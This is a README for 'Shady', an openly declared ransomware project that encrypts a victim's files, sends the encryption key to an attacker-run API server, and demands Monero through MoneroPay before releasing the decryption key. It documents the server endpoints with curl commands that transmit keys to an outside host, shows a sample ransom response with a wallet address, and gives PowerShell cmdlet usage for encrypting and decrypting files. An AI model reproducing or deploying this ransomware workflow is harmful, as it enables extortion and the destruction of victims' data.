# Shady

Very basic ransomware implementation that encrypts files, sends encryption keys to the API server, requests Monero from the user. Uses [MoneroPay](https://gitlab.com/moneropay/moneropay) to track payments sent by the victim. Provides an endpoint for the user to download keys to decrypt their files if the payment has arrived.

That's right. The only way I will ever touch Powershell is if it's gonna be straight up malware. Universities need to stop teaching proprietary software that nobody uses. Teach a [real](https://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html) shell, not a C# interpreter.

>Now there's a MoneroPay powered ransomware that isn't the original Moneropay ransomware which wasn't powered by MoneroPay.\
-- crtoff

## Server
### POST /encrypt
```sh
curl -X POST http://baseurl:1337/encrypt -d "key=keystring"
```

#### Response
```
740f1fb1-c47d-4059-8104-accdc718a1b4 8BGoVn4r5mPL9qYjFmaNGyLKmVvHzQj6Z51YpPL67br9fynLsjaEG7PJaTpmjbUi7bWikXmaBTo7pWdbLo1CQMqiUFrBzPV 0.1
```

The format is as follows: [Payment ID] [Monero address] [Monero amount in float]

### GET /decrypt/{id}
```sh
curl -X GET http://baseurl:1337/decrypt/{payment_id}
```

#### Response
If the ransom was paid the response body will contain the key that will be used to decrypt the files.

### POST /callback/{id}
This endpoint is given to MoneroPay to callback.

## Client
Import as cmdlet:
```
Import-Module shady-client.ps1
```

Encrypt all files with .txt extension in the current working directory:

```
Shady-Client -Encrypt
```

Decrypt files once the ransom has been paid:
```
Shady-Client -Decrypt
```
